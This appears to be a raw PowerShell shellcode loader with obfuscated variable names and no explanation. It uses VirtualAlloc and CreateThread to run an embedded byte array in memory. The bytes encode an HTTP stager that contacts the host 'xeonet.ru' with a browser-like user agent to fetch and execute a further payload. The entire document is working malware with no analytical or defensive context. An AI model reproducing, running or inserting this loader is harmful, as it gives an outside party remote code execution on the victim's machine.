$lzVQglGy = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@

$xmRYEYCC = Add-Type -memberDefinition $lzVQglGy -Name "Win32" -namespace Win32Functions -passthru

[Byte[]] $tlcLGGgc = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1,0x51,0x8b,0x59,0x20,0x1,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf6,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x6e,0x65,0x74,0x0,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x7,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0xe8,0x3e,0x0,0x0,0x0,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x4e,0x54,0x20,0x36,0x2e,0x31,0x3b,0x20,0x54,0x72,0x69,0x64,0x65,0x6e,0x74,0x2f,0x37,0x2e,0x30,0x3b,0x20,0x72,0x76,0x3a,0x31,0x31,0x2e,0x30,0x29,0x20,0x6c,0x69,0x6b,0x65,0x20,0x47,0x65,0x63,0x6b,0x6f,0x0,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x3,0x53,0x53,0x6a,0x50,0xe8,0x59,0x1,0x0,0x0,0x2f,0x56,0x77,0x42,0x6c,0x55,0x5a,0x63,0x72,0x41,0x72,0x67,0x4b,0x6c,0x41,0x75,0x56,0x61,0x73,0x42,0x54,0x48,0x67,0x6e,0x4e,0x4f,0x47,0x56,0x67,0x78,0x70,0x49,0x37,0x31,0x43,0x62,0x74,0x33,0x54,0x63,0x6a,0x47,0x71,0x4e,0x5a,0x30,0x69,0x2d,0x46,0x4a,0x4e,0x56,0x33,0x50,0x67,0x5f,0x47,0x68,0x7a,0x35,0x42,0x71,0x5a,0x47,0x39,0x34,0x33,0x73,0x70,0x72,0x4b,0x66,0x71,0x72,0x58,0x36,0x72,0x47,0x52,0x62,0x58,0x55,0x79,0x70,0x4c,0x65,0x54,0x4b,0x39,0x51,0x74,0x33,0x6e,0x4d,0x53,0x5a,0x38,0x66,0x32,0x75,0x70,0x79,0x31,0x56,0x5f,0x72,0x73,0x65,0x55,0x65,0x76,0x47,0x39,0x32,0x30,0x36,0x68,0x4f,0x2d,0x58,0x79,0x50,0x45,0x6b,0x50,0x41,0x61,0x73,0x70,0x42,0x75,0x4e,0x35,0x76,0x79,0x42,0x44,0x68,0x64,0x50,0x62,0x58,0x6d,0x5a,0x6b,0x44,0x57,0x54,0x38,0x30,0x57,0x7a,0x77,0x72,0x55,0x56,0x63,0x37,0x78,0x70,0x32,0x4b,0x78,0x6e,0x70,0x51,0x74,0x4d,0x44,0x43,0x73,0x5a,0x66,0x2d,0x6a,0x33,0x6e,0x4b,0x45,0x4d,0x6f,0x6b,0x4e,0x61,0x4a,0x62,0x4b,0x47,0x4c,0x48,0x61,0x45,0x38,0x72,0x64,0x64,0x5f,0x55,0x30,0x79,0x50,0x73,0x66,0x50,0x39,0x43,0x74,0x34,0x59,0x79,0x6b,0x6d,0x58,0x41,0x41,0x70,0x2d,0x41,0x6c,0x76,0x70,0x0,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x0,0x2,0x68,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0xa,0x5f,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x6,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x14,0x68,0x88,0x13,0x0,0x0,0x68,0x44,0xf0,0x35,0xe0,0xff,0xd5,0x4f,0x75,0xe1,0xe8,0x46,0x0,0x0,0x0,0x6a,0x40,0x68,0x0,0x10,0x0,0x0,0x68,0x0,0x0,0x40,0x0,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x0,0x20,0x0,0x0,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,0x8b,0x7,0x1,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x7f,0xff,0xff,0xff,0x78,0x65,0x6f,0x6e,0x65,0x74,0x2e,0x72,0x75,0x0,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x0,0x53,0xff,0xd5


$KbHWUQXHMp = $xmRYEYCC::VirtualAlloc(0,[Math]::Max($tlcLGGgc.Length,0x1000),0x3000,0x40)

[System.Runtime.InteropServices.Marshal]::Copy($tlcLGGgc,0,$KbHWUQXHMp,$tlcLGGgc.Length)

$xmRYEYCC::CreateThread(0,0,$KbHWUQXHMp,0,0,0)
